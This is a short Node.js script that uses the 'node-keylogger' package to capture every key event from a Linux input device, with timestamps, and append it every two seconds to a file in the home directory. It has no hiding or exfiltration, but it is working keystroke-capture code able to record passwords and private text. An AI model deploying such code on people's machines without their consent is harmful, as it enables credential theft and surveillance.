const Keyboard = require('node-keylogger');
const fs = require('fs');
const process = require('process');
const os = require('os');
const path = require('path');

const NAME = process.argv[2] || 'keylog';

const FILE_PATH = process.env.KEYLOGGER_PATH || `${NAME}.json`;
const EVENT_FILE = process.env.EVENT_FILE || 'event3';
const WRITE_TO_FILE_MS = 2 * 1000;
const HOMEDIR = os.homedir();

let buffer = '';

const logKey = data => {
    buffer += `${data.timeS};${data.timeMS};${data.keyCode};${data.keyId};${data.type};${new Date()}\n`;
};

const saveDataToFile = () => {
    fs.appendFile(path.join(HOMEDIR, FILE_PATH), buffer, err => {
        if (err) {
            console.error('ERROR while writing to file: ', err);
        }
    });
    buffer = '';
};

const subscribeToKeyboardEvents = () => {
    const k = new Keyboard(EVENT_FILE);
    
    k.on('keyup', logKey);
    k.on('keydown', logKey);
    k.on('keypress', logKey);
    k.on('error', logKey);
};

subscribeToKeyboardEvents();
setInterval(saveDataToFile, WRITE_TO_FILE_MS);
